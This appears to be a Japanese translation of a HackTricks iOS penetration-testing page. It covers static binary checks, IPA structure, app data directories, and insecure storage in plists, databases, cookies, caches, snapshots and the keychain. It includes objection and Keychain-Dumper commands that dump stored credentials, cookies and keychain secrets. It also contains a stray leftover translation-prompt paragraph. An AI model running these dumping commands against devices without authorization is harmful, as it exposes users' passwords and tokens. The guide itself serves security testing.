# iOS Pentesting

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したり、HackTricksを**PDFでダウンロード**したりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## iOSの基礎

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## テスト環境

このページでは、**iOSシミュレータ**、**エミュレータ**、および**ジェイルブレイク**に関する情報を見つけることができます。

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## 初期分析

### 基本的なiOSテスト操作

テスト中には、いくつかの操作が提案されます（デバイスへの接続、ファイルの読み書き/アップロード/ダウンロード、一部のツールの使用など）。したがって、これらのアクションのいずれかを実行する方法がわからない場合は、**ページを読み始めてください**：

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
以下の手順では、アプリがデバイスに**インストールされている必要があり**、アプリの**IPAファイル**をすでに取得している必要があります。\
これを行う方法については、[Basic iOS Testing Operations](basic-ios-testing-operations.md)ページを読んでください。
{% endhint %}

### 基本的な静的分析

IPAファイルに対して自動的な静的分析を実行するために、ツール[**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF)を使用することをお勧めします。

バイナリに存在する**保護の識別**：

*   **PIE（Position Independent Executable）**：有効にすると、アプリケーションは起動するたびにランダムなメモリアドレスにロードされるため、初期メモリアドレスを予測するのが困難になります。

```
otool -hv <app-binary> | grep PIE   # PIEフラグを含める必要があります
```
*   **スタックキャナリー**：スタックの整合性を検証するために、関数を呼び出す前にスタックに「キャナリー」値が配置され、関数が終了すると再度検証されます。

```
otool -I -v <app-binary> | grep stack_chk   # stack_chk_guardとstack_chk_failのシンボルを含める必要があります
```
*   **ARC（Automatic Reference Counting）**：一般的なメモリ破損の欠陥を防ぐために

```
otool -I -v <app-binary> | grep objc_release   # _objc_releaseシンボルを含める必要があります
```
*   **暗号化されたバイナリ**：バイナリは暗号化されている必要があります

```
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # cryptidは1である必要があります
```

**機密/安全でない関数の識別**

*   **弱いハッシュアルゴリズム**

```
# iOSデバイス上で
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# Linux上で
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **安全でないランダム関数**

```
# iOSデバイス上で
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# Linux上で
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **安全でない「Malloc」関数**

```
# iOSデバイス上で
otool -Iv <app> | grep -w "_malloc"

# Linux上で
grep -iER "_malloc"
```
*   **安全で脆弱な関数**

```
# iOSデバイス上で
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# Linux上で
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```
### 基本的な動的解析

[**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF)が実行する動的解析を確認してください。異なるビューをナビゲートし、それらと対話する必要がありますが、いくつかのクラスをフックして他の操作を行い、完了したらレポートを作成します。

### インストールされたアプリのリスト表示

デバイスにインストールされているアプリを対象にする場合、まず分析したいアプリケーションの正しいバンドル識別子を特定する必要があります。`frida-ps -Uai`を使用して、接続されたUSBデバイス（`-U`）に現在インストールされている（`-i`）すべてのアプリ（`-a`）を取得できます。
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### 基本的な列挙とフック

アプリケーションのコンポーネントを列挙する方法と、簡単にメソッドとクラスをフックする方法を学びましょう。objectionを使用してください。

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### IPAの構造

`.ipa`ファイルは**圧縮されたパッケージ**ですので、拡張子を`.zip`に変更して**解凍**することができます。インストールする準備ができた**完全なパッケージ化された**アプリは一般的に**バンドル**と呼ばれます。\
解凍すると、`<NAME>.app`という名前のフォルダが表示され、その中に他のリソースが含まれているzipアーカイブがあります。

* `Info.plist`: アプリケーション固有の設定を含むファイルです。
* `_CodeSignature/`: バンドル内のすべてのファイルに対する署名を含むplistファイルが含まれています。
* `Assets.car`: アイコンなどのアセットが含まれる別のzipアーカイブです。
* `Frameworks/`: .dylibまたは.frameworkファイルとしてのアプリのネイティブライブラリが含まれています。
* `PlugIns/`: .appexファイルとしてのアプリの拡張機能が含まれている場合があります（例では表示されません）。
* [`Core Data`](https://developer.apple.com/documentation/coredata): オフラインでアプリケーションの永続的なデータを保存し、一時的なデータをキャッシュし、アプリケーションのアンドゥ機能を追加するために使用されます。単一のiCloudアカウント内の複数のデバイス間でデータを同期するために、Core Dataはスキーマを自動的にCloudKitコンテナにミラーリングします。
* [`PkgInfo`](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): `PkgInfo`ファイルは、アプリケーションまたはバンドルのタイプと作成者コードを指定する別の方法です。
* **en.lproj, fr.proj, Base.lproj**: これらは、特定の言語のリソースと、言語がサポートされていない場合のデフォルトリソースを含む言語パックです。

iOSアプリケーションでUIを定義するための複数の方法があります: _storyboard_, _nib_または_xib_ファイルです。

**Info.plist**

情報プロパティリストまたは`Info.plist`は、iOSアプリの情報の主要な情報源です。アプリの重要な設定情報を記述した、キーと値のペアを含む構造化ファイルで構成されています。実際には、すべてのバンドルされた実行可能ファイル（アプリ拡張、フレームワーク、アプリ）には**必ず**`Info.plist`ファイルがあることが期待されています。すべての可能なキーについては、[**Apple Developer Documentation**](https://developer.apple.com/documentation/bundleresources/information\_property\_list?language=objc)を参照してください。

ファイルは**XMLまたはバイナリ（bplist）**でフォーマットされている場合があります。次の単純なコマンドを使用して、XML形式に変換できます。

* macOSの場合は、macOS 10.2以降のバージョンにネイティブに付属しているツールである`plutil`を使用します（公式のオンラインドキュメントは現在利用できません）:

```bash
$ plutil -convert xml1 Info.plist
```
* Linuxの場合:

```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```

以下は、`Info.plist`ファイルで簡単に検索できるいくつかの情報と対応するキーワードの非網羅的なリストです。ファイルを調査するか、`grep -i <keyword> Info.plist`を使用して検索できます。

* アプリの許可目的の文字列: `UsageDescription`
* カスタムURLスキーム: `CFBundleURLTypes`
* エクスポート/インポートされたカスタムドキュメントタイプ: `UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`
* アプリトランスポートセキュリティ（ATS）の設定: `NSAppTransportSecurity`

これらのポイントをテストする方法については、該当する章を参照してください。

**データパス**

iOSでは、**システムアプリケーションは`/Applications`**ディレクトリにあり、**ユーザーがインストールした**アプリは**`/private/var/containers/`**以下で利用できます。ただし、ファイルシステムをナビゲートして適切なフォルダを見つけることは簡単なタスクではありません。なぜなら、**すべてのアプリにはランダムな128ビットUUID（ユニバーサルユニーク識別子）**が割り当てられ、ディレクトリ名に使用されるからです。

ユーザーがインストールしたアプリのインストールディレクトリ情報を簡単に取得するために、objectionのコマンド`env`を使用することもできます。これにより、アプリのすべてのディレクトリ情報が表示されます。
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
以下は、ハッキング技術に関する本の内容です。以下の内容は、mobile-pentesting/ios-pentesting/README.mdファイルからのものです。関連する英語のテキストを日本語に翻訳し、翻訳を返し、マークダウンとHTMLの構文を完全に保持してください。コード、ハッキング技術の名前、ハッキングの言葉、クラウド/SaaSプラットフォームの名前（Workspace、aws、gcpなど）、'leak'という単語、ペンテスト、マークダウンタグなどは翻訳しないでください。また、翻訳とマークダウンの構文以外の追加のものは追加しないでください。

---

アプリには、次の2つの主要な場所があります：

* **バンドルディレクトリ** (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/`)。
* **データディレクトリ** (`/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/`)。

これらのフォルダには、アプリケーションのセキュリティ評価中に詳細に調査する必要がある情報が含まれています（たとえば、保存されたデータの機密データの分析時など）。

**バンドルディレクトリ：**

* **AppName.app**
* これはIPAで以前に見たアプリケーションバンドルであり、必要なアプリケーションデータ、静的コンテンツ、およびアプリケーションのコンパイルされたバイナリを含んでいます。
* このディレクトリはユーザーには見えますが、**ユーザーは書き込むことはできません**。
* このディレクトリの内容は**バックアップされません**。
* このフォルダの内容は、コードの署名を**検証するために使用**されます。

**データディレクトリ：**

* **Documents/**
* ユーザーが生成したすべてのデータが含まれています。このデータの作成は、アプリケーションのエンドユーザーによって開始されます。
* ユーザーに見え、**ユーザーは書き込むことができます**。
* このディレクトリの内容は**バックアップされます**。
* アプリは、`NSURLIsExcludedFromBackupKey`を設定することでパスを無効にすることができます。
* **Library/**
* **ユーザー固有ではない**すべてのファイルが含まれています。これには、**キャッシュ**、**設定**、**クッキー**、およびプロパティリスト（plist）の設定ファイルが含まれます。
* iOSアプリは通常、`Application Support`と`Caches`のサブディレクトリを使用しますが、アプリはカスタムのサブディレクトリを作成することもできます。
* **Library/Caches/**
* **一時的にキャッシュされたファイル**が含まれています。
* ユーザーには見えず、**ユーザーは書き込むことはできません**。
* このディレクトリの内容は**バックアップされません**。
* アプリが実行されていないときやストレージ容量が不足しているときに、OSがこのディレクトリのファイルを自動的に削除する場合があります。
* **Library/Application Support/**
* アプリの実行に必要な**永続的なファイル**が含まれています。
* ユーザーには**見えず**、ユーザーは書き込むことはできません。
* このディレクトリの内容は**バックアップされます**。
* アプリは、`NSURLIsExcludedFromBackupKey`を設定することでパスを無効にすることができます。
* **Library/Preferences/**
* **アプリケーションが再起動しても永続化される**プロパティの保存に使用されます。
* 情報は、\[BUNDLE\_ID].plistという名前のplistファイル内に、暗号化されていない状態でアプリケーションのサンドボックス内に保存されます。
* `NSUserDefaults`を使用して保存されたすべてのキー/値のペアは、このファイル内で見つけることができます。
* **tmp/**
* アプリの起動間に永続化する必要のない**一時ファイル**を書き込むためにこのディレクトリを使用します。
* 非永続的なキャッシュファイルが含まれています。
* ユーザーには**見えません**。
* このディレクトリの内容はバックアップされません。
* アプリが実行されていないときやストレージ容量が不足しているときに、OSがこのディレクトリのファイルを自動的に削除する場合があります。

iGoat-Swiftのバンドルディレクトリ（`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`）内のアプリケーションバンドル（.app）ディレクトリを詳しく見てみましょう。
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### バイナリリバースエンジニアリング

`<application-name>.app` フォルダの中には `<application-name>` という名前のバイナリファイルがあります。これが**実行**されるファイルです。ツール **`otool`** を使用してバイナリの基本的な検査を行うことができます。
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**アプリが暗号化されているか確認する**

次のコマンドを実行して、出力があるか確認してください:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**バイナリの逆アセンブル**

テキストセクションを逆アセンブルします：
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
サンプルアプリケーションの**Objective-Cセグメント**を出力するには、次のコマンドを使用します：
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
よりコンパクトなObjective-Cコードを取得するためには、[**class-dump**](http://stevenygard.com/projects/class-dump/)を使用することができます。
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
ただし、バイナリを逆アセンブルするための最良のオプションは、[**Hopper**](https://www.hopperapp.com/download.html?)と[**IDA**](https://www.hex-rays.com/products/ida/support/download\_freeware/)です。

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## データの保存

iOSがデバイスにデータを保存する方法については、次のページを参照してください：

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
情報を保存するための以下の場所は、**アプリケーションをインストールした直後**、**アプリケーションのすべての機能を確認した後**、さらには**1つのユーザーからログアウトして別のユーザーにログインした後**にチェックする必要があります。\
目標は、アプリケーション（パスワード、トークン）、現在のユーザー、以前にログインしたユーザーの**保護されていない機密情報**を見つけることです。
{% endhint %}

### Plist

**plist**ファイルは、**キーと値のペアを含む**構造化されたXMLファイルです。これは永続的なデータを保存する方法であり、したがって、これらのファイルには**機密情報が含まれている場合があります**。アプリをインストールした後や、アプリを集中的に使用した後に、新しいデータが書き込まれているかどうかを確認するために、これらのファイルをチェックすることをお勧めします。

plistファイルにデータを永続化する最も一般的な方法は、**NSUserDefaults**の使用です。このplistファイルは、**`Library/Preferences/<appBundleID>.plist`**にアプリのサンドボックス内に保存されます。

[`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults)クラスは、デフォルトのシステムとのプログラム的なインターフェースを提供します。デフォルトのシステムにより、アプリケーションは**ユーザーの設定に応じて動作をカスタマイズ**することができます。`NSUserDefaults`に保存されたデータは、アプリケーションバンドルで表示することができます。このクラスは、データをplistファイルに保存しますが、少量のデータと一緒に使用することを意図しています。

このデータは、信頼できるコンピュータから直接アクセスすることはできませんが、**バックアップ**を実行することでアクセスすることができます。

`NSUserDefaults`を使用して保存された情報を**ダンプ**するには、objectionの`ios nsuserdefaults get`を使用します。

アプリケーションが使用するすべてのplistを見つけるには、`/private/var/mobile/Containers/Data/Application/{APPID}`にアクセスして次のコマンドを実行します：
```bash
find ./ -name "*.plist"
```
ファイルは**XMLまたはバイナリ（bplist）**形式でフォーマットされている可能性があります。次の単純なコマンドを使用して、XML形式に変換できます：

*   macOSでは、`plutil`を使用します。これはmacOS 10.2以降のバージョンにネイティブに付属しているツールです（公式のオンラインドキュメントは現在利用できません）：

```bash
$ plutil -convert xml1 Info.plist
```
*   Linuxでは：

```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
*   objectionのセッションで：

```bash
ios plist cat /private/var/mobile/Containers/Data/Application/AF1F534B-1B8F-0825-ACB21-C0301AB7E56D/Library/Preferences/com.some.package.app.plist
```

### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple\_ref/doc/uid/TP40001075-CH8-SW1)は、アプリケーションのモデルレイヤーを管理するためのフレームワークです。[Core Dataは永続ストアとしてSQLiteを使用することができます](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/)が、フレームワーク自体はデータベースではありません。\
CoreDataはデフォルトではデータを暗号化しません。ただし、追加の暗号化レイヤーをCoreDataに追加することができます。詳細については、[GitHubリポジトリ](https://github.com/project-imas/encrypted-core-data)を参照してください。

アプリケーションのSQLite Core Data情報は、パス`/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`にあります。

**SQLiteを開いて機密情報にアクセスできる場合、設定ミスを見つけたことになります。**

{% code title="iGoatからのコード" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase)はSQLiteの上に構築されたキー/値ストアです。\
YapデータベースはSQLiteデータベースなので、前のセクションで説明した方法で見つけることができます。

### その他のSQLiteデータベース

アプリケーションが独自のSQLiteデータベースを作成することは一般的です。それらには**機密データ**が保存されており、暗号化されていない場合があります。そのため、アプリケーションディレクトリ内のすべてのデータベースをチェックすることは常に興味深いです。したがって、データが保存されているアプリケーションディレクトリに移動します (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Firebaseリアルタイムデータベース

アプリケーション開発者は、**NoSQLクラウドホストデータベースとのデータの保存と同期にFirebaseリアルタイムデータベースを利用**することができます。データはJSONとして保存され、リアルタイムで接続されたすべてのクライアントに同期され、アプリケーションがオフラインになっても利用可能です。

ミス構成されたFirebaseデータベースをチェックする方法は、こちらを参照してください：

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Realmデータベース

[Realm Objective-C](https://realm.io/docs/objc/latest/)と[Realm Swift](https://realm.io/docs/swift/latest/)はAppleによって提供されていませんが、それらは注目に値します。**暗号化が有効になっていない限り、すべてのデータが暗号化されずに保存されます**。

これらのデータベースは`/private/var/mobile/Containers/Data/Application/{APPID}`に見つけることができます。
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
このデータベースファイルを開くために、[**Realm Studio**](https://github.com/realm/realm-studio)というツールを使用することができます。

以下の例は、Realmデータベースで暗号化を使用する方法を示しています:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Couchbase Lite データベース

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios)は、軽量で埋め込み型のドキュメント指向（NoSQL）データベースエンジンであり、同期が可能です。iOSおよびmacOS向けにネイティブにコンパイルされます。

`/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/`には、Couchbaseデータベースが存在する可能性がありますので、確認してください。

### クッキー

iOSはアプリのクッキーを各アプリのフォルダ内の**`Library/Cookies/cookies.binarycookies`**に保存します。ただし、開発者は時々、バックアップでアクセスできるという理由で、これらを**キーチェーン**に保存することを選択することもあります。

クッキーファイルを調査するには、[**このPythonスクリプト**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser)を使用するか、objectionの**`ios cookies get`**を使用できます。\
また、objectionを使用してこれらのファイルをJSON形式に変換し、データを調査することもできます。
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### キャッシュ

デフォルトでは、NSURLSessionは**HTTPリクエストとレスポンスをCache.dbデータベースに保存**します。このデータベースには、トークン、ユーザー名、またはその他の機密情報がキャッシュされている場合、**機密データ**が含まれている可能性があります。キャッシュされた情報を見つけるには、アプリのデータディレクトリ（`/var/mobile/Containers/Data/Application/<UUID>`）を開き、`/Library/Caches/<Bundle Identifier>`に移動します。**WebKitキャッシュもCache.dbファイルに保存**されています。**Objection**は、`sqlite connect Cache.db`コマンドを使用してデータベースを開いて操作することができます。これは**通常のSQLiteデータベース**です。

リクエストまたはレスポンスに機密情報が含まれている可能性があるため、このデータのキャッシュを無効にすることが**推奨されています**。以下のリストは、これを実現するためのさまざまな方法を示しています：

1. ログアウト後にキャッシュされたレスポンスを削除することをお勧めします。これはAppleが提供する[`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses)というメソッドを使用して行うことができます。次のようにこのメソッドを呼び出すことができます：

`URLCache.shared.removeAllCachedResponses()`

このメソッドは、Cache.dbファイルからすべてのキャッシュされたリクエストとレスポンスを削除します。
2. クッキーの利点を使用する必要がない場合は、URLSessionの[.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral)構成プロパティを使用することをお勧めします。これにより、クッキーとキャッシュの保存が無効になります。

[Appleのドキュメント](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral)：

`ephemeralセッション構成オブジェクトは、デフォルトのセッション構成オブジェクト（defaultを参照）と似ていますが、対応するセッションオブジェクトはキャッシュ、資格情報ストア、またはディスク上のセッション関連データを保存しません。代わりに、セッション関連のデータはRAMに保存されます。ephemeralセッションがデータをディスクに書き込むのは、URLの内容をファイルに書き込むように指示した場合のみです。`
3. キャッシュは、キャッシュポリシーを[.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed)に設定することで無効にすることもできます。これにより、メモリまたはディスク上のいかなる方法でもキャッシュの保存が無効になります。

### スナップショット

ホームボタンを押すたびに、iOSは現在の画面のスナップショットを撮影し、アプリケーションへの遷移をよりスムーズに行うために使用します。ただし、現在の画面に**機密データ**が含まれている場合、それは**画像に保存**されます（これは**再起動を超えて永続化**されます）。これらのスナップショットは、ホーム画面をダブルタップしてアプリ間を切り替えることでアクセスすることもできます。

iPhoneがジェイルブレイクされていない限り、**攻撃者**はこれらのスクリーンショットを見るためには、**デバイスにアクセスするためのブロック解除**が必要です。デフォルトでは、最後のスナップショットはアプリのサンドボックス内の`Library/Caches/Snapshots/`または`Library/SplashBoard/Snapshots`フォルダに保存されます（信頼されたコンピュータはiOS 7.0以降ではファイルシステムにアクセスできません）。

この問題を防ぐ方法の一つは、スナップショットを撮る前に空白の画面を表示するか、機密データを削除することです。これは`ApplicationDidEnterBackground()`関数を使用して行うことができます。

以下は、デフォルトのスクリーンショットを設定するサンプルの修正方法です。

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objective-C（オブジェクティブ-C）：
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
この設定は、アプリケーションがバックグラウンドになったときに背景画像を`overlayImage.png`に設定します。`overlayImage.png`は常に現在のビューを上書きするため、機密データの漏洩を防ぎます。

### キーチェーン

[**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper)のようなツールを使用してキーチェーンをダンプすることができます（デバイスはジェイルブレイクされている必要があります）。\
また、[**Objection**](https://github.com/sensepost/objection)の`ios keychain dump`も使用できます。

**NSURLCredential**

**NSURLCredential**は、ユーザー名とパスワードをキーチェーンに保存するための完璧なクラスです。NSUserDefaultsやキーチェーンラッパーを使用する必要はありません。\
ユーザーがログインしたら、彼のユーザー名とパスワードをキーチェーンに保存することができます。
```swift
NSURLCredential *credential;

credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
**Objectionの** `ios nsurlcredentialstorage dump` を使用して、これらの秘密情報をダンプすることができます。

## カスタムキーボード/キーボードキャッシュ

iOS 8.0以降、Appleはカスタムキーボードなどのカスタム拡張機能をiOSにインストールすることを許可しています。\
インストールされたキーボードは、**設定** > **一般** > **キーボード** > **キーボード** から管理できます。\
カスタムキーボードは、**キーストローク**をスニフィングしてそれらを攻撃者のサーバーに送信することができます。ただし、**ネットワーキング接続が必要なカスタムキーボードはユーザーに通知されます。**\
また、**ユーザーは別の**（より信頼性の高い）**キーボード**に切り替えて資格情報を入力することができます。

さらに、**アプリケーションは、アプリ内でカスタムキーボードの使用を制限**することができます（または少なくともアプリの重要な部分では制限できます）。

{% hint style="warning" %}
ユーザーがそれらを必要としないと考える場合、サードパーティのキーボードを許可しないことをお勧めします。
{% endhint %}

オートコレクトとオートサジェストのため、デフォルトのiOSキーボードは、属性**securetTextEntry**が**true**に設定されていない場合、または**autoCorrectionType**が**UITextAutoCorrectionTypeNo**に設定されていない場合、キャッシュファイルに各非標準単語をキャプチャして保存します。

